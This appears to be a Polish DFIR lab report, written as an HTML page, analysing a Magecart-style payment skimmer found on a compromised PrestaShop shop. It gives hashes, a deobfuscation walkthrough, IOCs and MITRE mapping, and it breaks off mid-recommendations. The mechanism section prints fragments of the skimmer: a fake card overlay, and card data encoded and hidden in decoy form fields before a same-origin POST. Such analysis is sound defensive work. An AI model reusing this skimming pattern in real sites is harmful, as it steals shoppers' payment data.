@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="pl" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<title>THREAT-027 - Skimmer platnosci na ekgroup.pl: kompromitacja checkoutu PrestaShop w stylu Magecart</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root[data-theme="dark"]{
+    --bg: #14161B;
+    --bg2: #1B1E24;
+    --bg3: #21242B;
+    --border: #2B2E34;
+    --border2: #3D4048;
+    --ink: #E7E9ED;
+    --ink-dim: #A6ABB5;
+    --ink-faint: #6F7580;
+    --red: #DE6A5C;
+    --red-bg: rgba(222,106,92,0.09);
+    --red-border: rgba(222,106,92,0.35);
+    --green: #6FB98A;
+    --green-bg: rgba(111,185,138,0.09);
+    --green-border: rgba(111,185,138,0.35);
+    --amber: #D6A24E;
+    --amber-bg: rgba(214,162,78,0.09);
+    --amber-border: rgba(214,162,78,0.35);
+    --steel: #8FA3C7;
+    --steel-bg: rgba(143,163,199,0.09);
+    --steel-border: rgba(143,163,199,0.35);
+    --identity: #E8934F;
+  }
+  :root[data-theme="light"]{
+    --bg: #F5F6F8;
+    --bg2: #FFFFFF;
+    --bg3: #EBEDF1;
+    --border: #DADDE3;
+    --border2: #B7BCC6;
+    --ink: #191B1F;
+    --ink-dim: #54585F;
+    --ink-faint: #7C8798;
+    --red: #A6192E;
+    --red-bg: rgba(166,25,46,0.06);
+    --red-border: rgba(166,25,46,0.3);
+    --green: #2F7A4C;
+    --green-bg: rgba(47,122,76,0.07);
+    --green-border: rgba(47,122,76,0.3);
+    --amber: #9A6A17;
+    --amber-bg: rgba(154,106,23,0.08);
+    --amber-border: rgba(154,106,23,0.3);
+    --steel: #2B3A55;
+    --steel-bg: rgba(43,58,85,0.07);
+    --steel-border: rgba(43,58,85,0.3);
+    --identity: #B5560F;
+  }
+
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:var(--bg);
+    color:var(--ink);
+    font-family:'IBM Plex Sans',-apple-system,sans-serif;
+    font-size:15px;
+    line-height:1.65;
+    transition:background .15s,color .15s;
+  }
+  code,.mono,pre,table{font-family:'IBM Plex Mono','SF Mono',monospace;}
+
+  .tlp-bar{
+    background:var(--red);
+    color:#fff;
+    font-size:12px;
+    font-weight:600;
+    letter-spacing:.03em;
+    text-align:center;
+    padding:7px 0;
+  }
+  .theme-toggle{
+    position:fixed;top:18px;right:18px;display:flex;gap:6px;
+    background:var(--bg2);border:1px solid var(--border2);padding:4px;border-radius:20px;z-index:10;
+  }
+  .theme-toggle button{
+    font-family:'IBM Plex Sans',sans-serif;font-size:12px;font-weight:500;border:none;
+    background:transparent;color:var(--ink-dim);padding:6px 14px;border-radius:16px;cursor:pointer;
+  }
+  .theme-toggle button.active{background:var(--ink);color:var(--bg);}
+
+  .wrap{max-width:880px;margin:0 auto;padding:56px 28px 120px;}
+
+  .doc-id{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--ink-faint);letter-spacing:.02em;margin-bottom:12px;}
+  h1{font-size:32px;font-weight:700;line-height:1.2;letter-spacing:-.01em;margin:0 0 12px;color:var(--ink);}
+  h1 em{color:var(--identity);font-style:normal;}
+  .dek{color:var(--ink-dim);font-size:16px;max-width:66ch;margin:0 0 26px;line-height:1.6;}
+
+  .byline{
+    display:flex;gap:28px;flex-wrap:wrap;font-size:13px;color:var(--ink-faint);
+    padding-top:18px;padding-bottom:26px;border-top:1px solid var(--border);margin-bottom:8px;
+  }
+  .byline b{color:var(--ink-dim);font-weight:500;}
+
+  .exec-summary{background:var(--red-bg);border-left:3px solid var(--red);padding:20px 24px;margin:32px 0 12px;}
+  .exec-summary .label{font-size:11.5px;text-transform:uppercase;letter-spacing:.06em;font-weight:600;color:var(--red);margin-bottom:8px;}
+  .exec-summary p{margin:0 0 8px;font-size:15px;color:var(--ink);max-width:72ch;}
+  .exec-summary p:last-child{margin-bottom:0;}
+  .exec-summary code{font-size:.9em;color:var(--red);}
+
+  section{margin:56px 0;}
+  h2{
+    font-size:12px;color:var(--ink-faint);text-transform:uppercase;letter-spacing:.1em;
+    border-bottom:1px solid var(--border);padding-bottom:10px;margin-bottom:24px;
+    display:flex;gap:10px;align-items:baseline;font-weight:600;
+  }
+  h2 .n{color:var(--steel);font-family:'IBM Plex Mono',monospace;}
+  h3{font-size:15.5px;color:var(--ink);font-weight:600;margin:26px 0 10px;letter-spacing:-.005em;}
+  p{margin:0 0 14px;font-size:14px;color:var(--ink-dim);max-width:72ch;}
+  strong{color:var(--ink);font-weight:600;}
+  code{font-size:.9em;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--steel);}
+  a{color:var(--steel);}
+
+  .notice{border-left:3px solid var(--steel);background:var(--bg2);padding:16px 20px;margin:20px 0;border-radius:0 6px 6px 0;}
+  .notice.amber{border-color:var(--amber);}
+  .notice.red{border-color:var(--red);}
+  .notice.green{border-color:var(--green);}
+  .notice .label{
+    display:inline-block;font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;
+    color:var(--steel);border:1px solid var(--steel-border);padding:2px 8px;border-radius:3px;margin-bottom:10px;
+  }
+  .notice.amber .label{color:var(--amber);border-color:var(--amber-border);}
+  .notice.red .label{color:var(--red);border-color:var(--red-border);}
+  .notice.green .label{color:var(--green);border-color:var(--green-border);}
+  .notice p{margin:0;font-size:13.5px;}
+  .notice p + p{margin-top:10px;}
+
+  .card{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:18px 22px;margin:16px 0;}
+  .card-title{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;gap:10px;flex-wrap:wrap;}
+  .card-title strong{font-size:14px;color:var(--ink);}
+  .tag-pill{font-size:10.5px;padding:2px 8px;border-radius:3px;font-weight:500;white-space:nowrap;text-transform:uppercase;letter-spacing:.03em;}
+  .tag-pill.high{background:var(--green-bg);color:var(--green);border:1px solid var(--green-border);}
+  .tag-pill.med{background:var(--amber-bg);color:var(--amber);border:1px solid var(--amber-border);}
+  .tag-pill.low{background:var(--red-bg);color:var(--red);border:1px solid var(--red-border);}
+  .tag-pill.steel{background:var(--steel-bg);color:var(--steel);border:1px solid var(--steel-border);}
+
+  .step{display:grid;grid-template-columns:30px 1fr;gap:18px;margin-bottom:26px;}
+  .step .num{font-size:13px;font-weight:600;color:var(--steel);padding-top:3px;font-family:'IBM Plex Mono',monospace;}
+  .step h3{margin:0 0 6px;}
+
+  .evidence{
+    font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--ink-dim);background:var(--bg2);
+    border:1px solid var(--border);border-left:2px solid var(--steel-border);padding:10px 14px;
+    white-space:pre-wrap;line-height:1.6;margin-top:8px;
+  }
+  .evidence .val{color:var(--steel);}
+
+  table{width:100%;border-collapse:collapse;font-size:13px;margin:8px 0;}
+  th{
+    text-align:left;color:var(--ink-faint);font-weight:600;font-size:10.5px;text-transform:uppercase;
+    letter-spacing:.05em;padding:0 12px 10px 0;border-bottom:2px solid var(--ink);
+  }
+  td{padding:12px 12px 12px 0;border-bottom:1px solid var(--border);color:var(--ink-dim);vertical-align:top;}
+  tr:last-child td{border-bottom:none;}
+  td.strong{color:var(--ink);font-weight:500;}
+  td.mono{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--steel);}
+  .ok{color:var(--green);} .bad{color:var(--red);} .warn{color:var(--amber);}
+
+  .ioc-row{display:grid;grid-template-columns:170px 1fr;gap:16px;padding:11px 0;border-bottom:1px solid var(--border);font-size:13px;}
+  .ioc-row:last-child{border-bottom:none;}
+  .ioc-row .type{color:var(--ink-faint);}
+  .ioc-row .val{font-family:'IBM Plex Mono',monospace;color:var(--ink);word-break:break-all;font-size:12px;}
+  .ioc-row .note{color:var(--ink-faint);font-size:11.5px;margin-top:3px;}
+
+  pre.code{
+    background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:16px 18px;
+    overflow-x:auto;font-size:11.5px;color:var(--ink-dim);line-height:1.7;margin:14px 0;
+  }
+  pre.code .c{color:var(--ink-faint);}
+  pre.code .hl{color:var(--steel);}
+  pre.code .warn{color:var(--amber);}
+
+  .kql-block{margin:32px 0;}
+  .kql-head{display:flex;justify-content:space-between;align-items:baseline;flex-wrap:wrap;gap:8px;margin-bottom:6px;}
+  .kql-head strong{font-size:14px;color:var(--ink);}
+  .kql-meta{font-size:11.5px;color:var(--ink-faint);}
+
+  ul,ol{margin:0 0 16px;padding-left:20px;font-size:14px;color:var(--ink-dim);}
+  li{margin-bottom:7px;}
+
+  .footer{margin-top:70px;padding-top:24px;border-top:1px solid var(--border);font-size:12px;color:var(--ink-faint);}
+</style>
+</head>
+<body>
+
+<div class="tlp-bar">TLP:CLEAR - DFIR LAB, UŻYTEK PORTFOLIO</div>
+<div class="theme-toggle">
+  <button id="btn-dark" class="active" onclick="setTheme('dark')">Ciemny</button>
+  <button id="btn-light" onclick="setTheme('light')">Jasny</button>
+</div>
+
+<div class="wrap">
+
+  <div class="doc-id">THREAT-027 &middot; DFIR LAB, REMNUX / WINDOWS 11 &middot; 2026-09-14 &middot; ANALIZA STATYCZNA, DYNAMICZNA I OSINT</div>
+  <h1>Skimmer platnosci na <em>ekgroup.pl</em>: kompromitacja checkoutu PrestaShop w stylu Magecart</h1>
+  <p class="dek">Dwa artefakty z jednego zdarzenia - wpis cache2 Firefoksa i surowy plik ze zrodla - doprowadzily do zdekodowania klienckiego skimmera kart platniczych serwowanego z wlasnej strony glownej sklepu PrestaShop. Statyka ujawnila pelny mechanizm eksfiltracji, dynamika w izolowanym labie potwierdzila wstrzykniecie overlaya na zywo, a urlscan.io rozstrzygnal, ze ekgroup.pl to nie posrednik, tylko wlasny, skompromitowany checkout sklepu.</p>
+
+  <div class="byline">
+    <span>Domena: <b>ekgroup.pl</b></span>
+    <span>Platforma ofiary: <b>PrestaShop</b></span>
+    <span>Klasyfikacja VT: <b>27/75 &middot; trojan.acsogenixx/abtrojan</b></span>
+    <span>Technika: <b>T1056.003</b></span>
+    <span>Modul: <b>static/ + windows/</b></span>
+  </div>
+
+  <div class="exec-summary">
+    <div class="label">Streszczenie kierownicze</div>
+    <p>Dwa pliki dostarczone do analizy - <strong>nowe.zip</strong> i <strong>yNuzF.7z</strong> - pochodza z tego samego zdarzenia i niosa ten sam material: obfuskowany skrypt JavaScript serwowany z <code>https://ekgroup.pl/js/yNuzF.js</code>, ktory po statycznej dekonstrukcji okazuje sie klienckim skimmerem kart platniczych w stylu <strong>Magecart</strong>.</p>
+    <p>Skrypt wykrywa strone koszyka/checkoutu (rozpoznaje haki wielu platform e-commerce naraz), wstrzykuje falszywy overlay platnosci z logotypami PayPal/Visa/Mastercard/Amex, przechwytuje numer karty, CVV, date waznosci oraz dane rozliczeniowe, a nastepnie eksfiltruje je przez XHR POST do sciezki glownej (<code>"/"</code>, same-origin) pod pozorem generycznych pol <code>*_hash</code> w formularzu. Ten sam plik (po SHA-256) wystepowal w VirusTotal pod dziesiecioma roznymi nazwami, w tym podszywajacymi sie pod arkusze stylow - to wspolny, powtarzalnie wdrazany kit, a nie kod pisany pod jedna ofiare.</p>
+    <p><strong>Aktualizacja po urlscan.io:</strong> ekgroup.pl to nie tylko hosting cudzego skryptu - to samo jest sklepem na PrestaShop, a <code>yNuzF.js</code> laduje sie na jego WLASNEJ stronie glownej obok legalnych skryptow motywu/modulow, w tym prawdziwej integracji platnosci Przelewy24. Najbardziej prawdopodobny scenariusz to wiec kompromitacja wlasnego checkoutu sklepu (klasyczny wzorzec Magecart na PrestaShop), nie wstrzykiwanie skryptu z zewnatrz do innej, nieznanej strony.</p>
+  </div>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">01</span> Material dowodowy</h2>
+
+    <p>Oba archiwa otwieraly sie haslem <code>infected</code> zgodnie z zapowiedzia. Po rozpakowaniu okazaly sie dwoma roznymi opakowaniami tej samej tresci - jedno to artefakt sledczy z konca urzadzenia, drugie to surowy plik pobrany wprost ze strony.</p>
+
+    <div class="card">
+      <div class="card-title"><strong>nowe.zip</strong><span class="tag-pill steel">Z incydentu</span></div>
+      <p>Po rozpakowaniu zawiera plik nazwany jak hash (<code>B6C9466B...</code>), ktory nie jest probka wykonywalna - to surowy wpis cache2 przegladarki Firefox: pelna transakcja HTTP (naglowki zadania/odpowiedzi + lancuch certyfikatow TLS) dla zasobu pobranego przez przegladarke na koncu. To dowod, ze przegladarka na badanym urzadzeniu faktycznie pobrala ten adres.</p>
+      <div class="evidence">SHA-256 (archiwum): <span class="val">adf0292cae415900fc4b75d82eefc22bd7e991831276629d7b935dff2df246a0</span>
+SHA-256 (wpis cache): <span class="val">fd7befc05e5693bfb58551591b2ea9f88c6e1f5edf8a3769aa3e06818094d082</span>
+Rozmiar: 54 740 B / po rozpakowaniu 62 607 B
+VirusTotal: brak w bazie (hash kontenera cache, nie samego JS)</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><strong>yNuzF.7z</strong><span class="tag-pill low">Ze strony</span></div>
+      <p>Zawiera <code>yNuzF.js</code> - dokladnie tyle danych, ile realnie wazy plik spod adresu URL (337 425 B, zgodne co do bajta z rozmiarem po dekompresji gzip zaobserwowanym w naglowkach cache). To surowy payload pobrany bezposrednio ze zrodla, gotowy do analizy statycznej.</p>
+      <div class="evidence">SHA-256 (archiwum): <span class="val">eba45798455f734832305a7328b01c9c49d36d3e87fe9bfcdff61b31305a8684</span>
+SHA-256 (yNuzF.js): <span class="val">1b23d13454bb4a2262da821bad3ada7a7f805fb33980abecefffafb4a10663e0</span>
+Rozmiar: 26 394 B / po rozpakowaniu 337 425 B
+VirusTotal: 27/75 &middot; trojan.acsogenixx/abtrojan</div>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">02</span> Dowod wykonania w przegladarce</h2>
+
+    <p>Wpis cache2 z <code>nowe.zip</code> to najmocniejszy element korelacji - potwierdza nie tylko istnienie pliku, ale realne zadanie HTTP wyslane przez przegladarke na badanej maszynie:</p>
+
+    <table>
+      <tr><th>Pole naglowka</th><th>Wartosc</th></tr>
+      <tr><td class="strong">Klucz partycji cache</td><td class="mono">partitionKey=%28https%2Cekgroup.pl%29,:https://ekgroup.pl/js/yNuzF.js</td></tr>
+      <tr><td class="strong">User-Agent</td><td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0</td></tr>
+      <tr><td class="strong">Zadanie</td><td class="ok">HTTP/2 200</td></tr>
+      <tr><td class="strong">Data odpowiedzi</td><td>Mon, 14 Sep 2026 11:30:19 GMT</td></tr>
+      <tr><td class="strong">Content-Type</td><td>text/javascript</td></tr>
+      <tr><td class="strong">Content-Encoding / Length</td><td>gzip / 51 096 B</td></tr>
+      <tr><td class="strong">Serwer</td><td>Apache</td></tr>
+      <tr><td class="strong">Certyfikat TLS</td><td>Let's Encrypt (CA "YE2"), CN=ekgroup.pl, SAN: ekgroup.pl, www.ekgroup.pl, mail.ekgroup.pl &middot; wazny 2026-09-05 &rarr; 2026-12-04</td></tr>
+    </table>
+
+    <p>51 096 B skompresowanego gzip w naglowku cache jest spojne z 337 425 B po dekompresji zaobserwowanymi w <code>yNuzF.js</code> (typowy wspolczynnik dla silnie powtarzalnego, zminifikowanego JS) - to kolejny, niezalezny punkt zgodnosci miedzy obydwoma plikami, obok samego URL-a.</p>
+
+    <div class="notice green">
+      <span class="label">Potwierdzone bajt-po-bajcie</span>
+      <p>Po dobudowaniu narzedzia <code>parse_browser_cache</code> cialo HTTP wyciagniete bezposrednio z wpisu cache2 zdekompresowalo sie do pliku o SHA-256 identycznym z <code>yNuzF.js</code> ze zrodla. Zgodnosc obu artefaktow jest potwierdzona bajt-po-bajcie, nie tylko po metadanych (URL/data/typ tresci) jak w pierwszym przebiegu tej analizy.</p>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">03</span> Przebieg analizy statycznej</h2>
+
+    <div class="step">
+      <div class="num">01</div>
+      <div>
+        <h3>upload_sample / extract_archive</h3>
+        <p>Rozpakowanie oboch plikow haslem <code>infected</code>. Z <code>nowe.zip</code> wypadl 1 plik (62 607 B), z <code>yNuzF.7z</code> - <code>yNuzF.js</code> (337 425 B).</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="num">02</div>
+      <div>
+        <h3>pe_metadata</h3>
+        <p>Plik z <code>nowe.zip</code> zwrocil <code>is_pe=false</code> - to dane gzip, nie PE. Proba dekompresji ujawnila, ze po strumieniu gzip nastepuja dodatkowe dane, typowe dla formatu cache2 Firefoksa (po ciele HTTP dopisywane sa metadane).</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="num">03</div>
+      <div>
+        <h3>extract_strings</h3>
+        <p>Ujawnil w plaskim tekscie naglowki HTTP, User-Agent Firefoksa, pelny lancuch certyfikatow TLS oraz kluczowy string z kluczem partycji cache wskazujacym wprost na <code>https://ekgroup.pl/js/yNuzF.js</code>.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="num">04</div>
+      <div>
+        <h3>hash_lookup / url_lookup / whois_lookup</h3>
+        <p><code>yNuzF.js</code> &rarr; <span class="bad">27/75</span>. Sam adres URL &rarr; 0/90 (nieoflagowany, typowe dla legalnej, skompromitowanej domeny). Domena zarejestrowana w 2011 r., brak sygnalow swiezo zarejestrowanej infrastruktury.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="num">05</div>
+      <div>
+        <h3>Deobfuskacja reczna (Python)</h3>
+        <p>Zrzut stringow z <code>yNuzF.js</code> to w calosci jedna linia kodu w stylu obfuscator.io - tablica stringow zakodowanych jako <code>\xHH</code> plus warstwa indeksow tablicowych. Rozkodowano recznie (REMnux w tej konfiguracji nie ma Node.js) do czytelnego HTML/JS parserem string-literal w Pythonie.</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="num">06</div>
+      <div>
+        <h3>yara_scan</h3>
+        <p>Domyslny ruleset <code>manalyze</code> - 0 trafien. Ruleset jest zorientowany na PE/manape, nie na JS przegladarkowy; wiekszosc regul zglosila bledy modulu manape niezwiazane z probka. Brak trafien tutaj nie jest sygnalem "czysty" - adresowane w sekcji 06 wlasna regula celowana w ten kit.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">04</span> Mechanizm skimmera</h2>
+
+    <p>Po rozkodowaniu tablicy stringow <code>yNuzF.js</code> okazuje sie skryptem dzialajacym w czterech krokach.</p>
+
+    <h3>1. Rozpoznanie strony platnosci</h3>
+    <p>Skrypt sprawdza obecnosc dziesiatkow charakterystycznych identyfikatorow DOM zebranych z wielu platform e-commerce naraz - m.in. <code>pay-with-payment-option-*-form</code>, <code>HOOK_PAYMENT</code>, <code>HOOK_ADVANCED_PAYMENT</code>, <code>opc_payment_methods</code>, <code>klarna-checkout-container</code>, <code>checkout-payment-step</code> - oraz wielojezycznych etykiet pola karty (card/carte/karte/tarjeta w roznych wariantach wielkosci liter). To generyczny, wieloplatformowy detektor "jestem na checkoucie", a nie kod pisany pod jeden konkretny sklep.</p>
+
+    <h3>2. Falszywy overlay platnosci</h3>
+    <p>Po trafieniu skrypt wstrzykuje przez <code>document.write</code> pelnoekranowy formularz platnosci zbudowany na jQuery 3.6.0 i Bootstrap 4.6.1 (z CDN), z inline'owanym SVG logotypow PayPal, Visa, Mastercard, Amex, Discover i Diners Club - wizualnie nie do odroznienia od prawdziwego widoku platnosci.</p>
+    <pre class="code">&lt;input id=cardNumber ... required&gt; &lt;svg ... id=cvvIcon-a&gt;...&lt;/svg&gt;
+&lt;p id=error_cardExpiry&gt;Please fill expiration date&lt;/p&gt;
+&lt;p id=error_cc_cid&gt;Please fill card cvv&lt;/p&gt;
+&lt;legend&gt;Billing address&lt;/legend&gt;</pre>
+
+    <h3>3. Przechwytywanie danych</h3>
+    <p>Listenery <code>keyup</code> na polach <code>cardNumber</code>, <code>CVV/cc_cid</code> i dacie waznosci skladaja dane karty w jeden obiekt razem z adresem rozliczeniowym/dostawy.</p>
+
+    <h3>4. Eksfiltracja pod przykrywka</h3>
+    <p>Zebrane dane trafiaja do <code>FormData</code> pod nazwami polnietycznie wygladajacymi na telemetrie ("hash"), a nie na dane platnicze - jedno z nich (<code>igift_hash</code>) niesie realny <code>JSON.stringify()</code> skradzionych danych zakodowany w <code>btoa()</code>, reszta to szum wypelniajacy losowymi ciagami tej samej dlugosci co realne pole, zeby zaden klucz nie wyrozial sie w body zadania:</p>
+    <pre class="code"><span class="c">// _0x7cbex3c = zebrany obiekt (numer karty, cvv, adres, ...)</span>
+formData.append("visit_hash", btoa(makeid(418)));      <span class="c">// szum</span>
+formData.append(<span class="hl">"igift_hash"</span>, btoa(JSON.stringify(_0x7cbex3c))); <span class="hl">// dane realne</span>
+formData.append("captcha_hash", btoa(makeid(1024)));    <span class="c">// szum</span>
+formData.append("user_hash", btoa(makeid(32)));         <span class="c">// szum</span>
+
+url = "/";  <span class="c">// same-origin, brak twardo wpisanej domeny C2</span>
+xhr.open("POST", url, true);
+xhr.onload = function(){ Reld() };  <span class="c">// zamazuje slad po wyslaniu</span>
+xhr.send(formData);
+
+document.cookie = "_Pres_ldk=...; path=/";  <span class="c">// znacznik "juz zebrano"</span>
+document.cookie = "_Pres_idk=...; path=/";</pre>
+
+    <p>POST idzie na sciezke <code>"/"</code> tej samej domeny, ktora serwuje skrypt - bez zaszytej na sztywno domeny C2, co utrudnia atrybucje bez logow serwera i sugeruje, ze komponent odbierajacy dane siedzi na tej samej (skompromitowanej) infrastrukturze co sam skrypt.</p>
+
+    <div class="notice">
+      <span class="label">Potwierdzenie na zywo (sekcja 10, decoy checkout)</span>
+      <p>Krok 1 i poczatek kroku 2 odtworzone eksperymentalnie w realnej przegladarce, poza laboratoryjnym decoy, bez dotykania zywej strony. Overlay wstrzykuje sie natychmiast po wykryciu haka DOM (<code>hasCardNumber: true</code> juz przy pierwszym pomiarze, ~500ms po zaladowaniu), a przycisk istnieje dokladnie tak, jak przewidywala statyka: <code>BUTTON:PLACE ORDER:onclick=processF()</code>.</p>
+      <p><strong>Niepotwierdzone:</strong> pelny lancuch klik &rarr; POST. Automatyczne klikniecie przycisku nie wyprodukowalo zadnego zauwazalnego efektu - DOM (bodyLen) pozostal identyczny przez 20+ sekund i zero POST-a dotarlo do lokalnego listenera. Prawdopodobne wyjasnienie ze stringow zebranych wczesniej: zmienna <code>asfdaw</code> i sprawdzenie ciasteczka (<code>if(cook==...){setInterval(misu21, 4000)}</code>) sugeruja, ze realna aktywacja moze byc bramkowana inaczej niz prosty onclick - ten watek nie zostal w pelni zmapowany i wymaga recznego debugowania w DevTools na zywej sesji.</p>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">05</span> Mapowanie na MITRE ATT&amp;CK</h2>
+    <table>
+      <tr><th>Technika</th><th>ID</th><th>Dowod</th></tr>
+      <tr>
+        <td class="strong">Drive-by Compromise</td>
+        <td class="mono">T1189</td>
+        <td>Skrypt zaladowany biernie przy wizycie na checkoucie skompromitowanej strony ekgroup.pl - potwierdzone wpisem cache Firefoksa.</td>
+      </tr>
+      <tr>
+        <td class="strong">Obfuscated Files or Information</td>
+        <td class="mono">T1027</td>
+        <td>Cala tresc yNuzF.js to jedna tablica stringow zakodowana jako \xHH (styl obfuscator.io) plus warstwa indeksow.</td>
+      </tr>
+      <tr>
+        <td class="strong">Input Capture: Web Portal Capture</td>
+        <td class="mono">T1056.003</td>
+        <td>Falszywy formularz platnosci (PayPal/karty) wstrzykniety w miejsce/na wierzch prawdziwego checkoutu, przechwytujacy cardNumber/CVV/expiry/adres.</td>
+      </tr>
+      <tr>
+        <td class="strong">Application Layer Protocol: Web Protocols</td>
+        <td class="mono">T1071.001</td>
+        <td>Eksfiltracja przez XHR POST po HTTPS do wlasnego originu skryptu.</td>
+      </tr>
+      <tr>
+        <td class="strong">Exfiltration Over Web Service</td>
+        <td class="mono">T1567</td>
+        <td>Dane wyprowadzone w polach FormData zamaskowanych jako generyczne *_hash, wmieszane miedzy pola-szum tej samej dlugosci.</td>
+      </tr>
+    </table>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">06</span> IOC</h2>
+
+    <div class="ioc-row">
+      <div class="type">SHA-256 (JS)</div>
+      <div><div class="val">1b23d13454bb4a2262da821bad3ada7a7f805fb33980abecefffafb4a10663e0</div><div class="note">yNuzF.js &middot; VT 27/75</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">SHA-256 (cache)</div>
+      <div><div class="val">fd7befc05e5693bfb58551591b2ea9f88c6e1f5edf8a3769aa3e06818094d082</div><div class="note">wpis cache2 Firefoksa, nie sam JS</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">SHA-256 (archiwum)</div>
+      <div><div class="val">adf0292cae415900fc4b75d82eefc22bd7e991831276629d7b935dff2df246a0</div><div class="note">nowe.zip, zrodlo incydentu</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">SHA-256 (archiwum)</div>
+      <div><div class="val">eba45798455f734832305a7328b01c9c49d36d3e87fe9bfcdff61b31305a8684</div><div class="note">yNuzF.7z, zrodlo strony</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">URL</div>
+      <div><div class="val">https://ekgroup.pl/js/yNuzF.js</div><div class="note">0/90 w VT URL-scan</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">Domena</div>
+      <div><div class="val">ekgroup.pl</div><div class="note">zarejestrowana 2011, skompromitowany sklep PrestaShop</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">Nazwy plikow (VT, ten sam hash)</div>
+      <div><div class="val">iPBrS.js, 9Q6Q0.css, 9JQVL.css, NYGyA.css, HEclu.js, Q6lte.css, soMtS.js, vwTpz.js, xERlI.js</div><div class="note">ten sam kit powielany pod losowa nazwa</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">Ciasteczka znacznikowe</div>
+      <div><div class="val">_Pres_ldk, _Pres_idk</div><div class="note">ustawiane po zebraniu danych</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">Pola FormData</div>
+      <div><div class="val">products_hash, amount_hash, billing_hash, shipping_hash, visit_hash, igift_hash, captcha_hash, user_hash</div><div class="note">realne dane: igift_hash, reszta - szum tej samej dlugosci</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">Platforma</div>
+      <div><div class="val">PrestaShop</div><div class="note">wlasny sklep, nie hosting posredni</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">Sciezka modulu platnosci</div>
+      <div><div class="val">/modules/przelewy24/views/js/przelewy24.js</div><div class="note">prawdziwa integracja platnosci obok skimmera</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">IP hostingu</div>
+      <div><div class="val">185.201.115.23</div><div class="note">pivot po innych domenach na tym IP - otwarty watek</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">ID skanu urlscan.io</div>
+      <div><div class="val">01a0a12d-4de7-746a-8754-f806bae637a0</div><div class="note">96 ze 119 zadan wskazuje wlasna strone glowna</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">Regula YARA</div>
+      <div><div class="val">static/yara_rules/ekgroup_skimmer.yar</div><div class="note">celowana w stringi kitu (_Pres_ldk, wzorzec *_hash, styl obfuskacji)</div></div>
+    </div>
+    <div class="ioc-row">
+      <div class="type">Potwierdzony ruch (capture)</div>
+      <div><div class="val">DNS/HTTP/TLS SNI do ekgroup.pl</div><div class="note">Wireshark, Ethernet0, windows_vm</div></div>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">07</span> Ryzyko i wplyw</h2>
+    <table>
+      <tr><th>Rodzaj danych</th><th>Wektor</th><th>Zasieg kitu</th><th>Wiek domeny</th></tr>
+      <tr><td class="bad">Pelne dane karty + adres</td><td>Przegladarka, bez pobierania pliku</td><td>10+ nazw plikow</td><td>14 lat</td></tr>
+    </table>
+    <p>Poniewaz przechwytywanie dzieje sie w calosci po stronie klienta (w DOM przegladarki), nie zostawia sladu na koncu w postaci Sysmon/auditd - z perspektywy telemetrii endpointowej jest to zwykly ruch HTTPS do znanej, dlugo istniejacej domeny biznesowej. Jedynym realistycznym punktem detekcji poza samym serwerem ofiary jest telemetria sieciowa/proxy patrzaca na tresc odpowiedzi (typ pliku niezgodny z rozszerzeniem, rozmiar, obecnosc znanego hasha) oraz sam fakt, ze checkout wysyla POST do wlasnego <code>"/"</code> z nietypowym ksztaltem body.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2><span class="n">08</span> Rekomendacje</h2>
+    <ol>
+      <li>Zawiadomic wlasciciela/administratora ekgroup.pl (lub CERT Polska, jesli brak bezposredniego kontaktu) - domena z 2011 r. wyglada na przejeta infrastrukture, nie na infrastrukture zbudowana pod atak.</li>
+      <li><strong>[Zrewidowane po urlscan.io]</strong> Pierwotna rekomendacja zakladala sprawdzenie, jaka INNA strona laduje <code>ekgroup.pl/js/yNuzF.js</code> jako zewnetrzny zasob. Potwierdzono jednak, ze skrypt laduje sie na WLASNEJ stronie glownej ekgroup.pl (96 ze 119 zadan skanu, obok modulu platnosci Przelewy24) - priorytetem jest wiec zabezpieczenie panelu administracyjnego/kodu szablonu tego konkretnego sklepu PrestaShop (typowe wektory: podatny modul, przejete konto admina, podmieniony plik szablonu), nie szukanie trzeciej strony.</li>
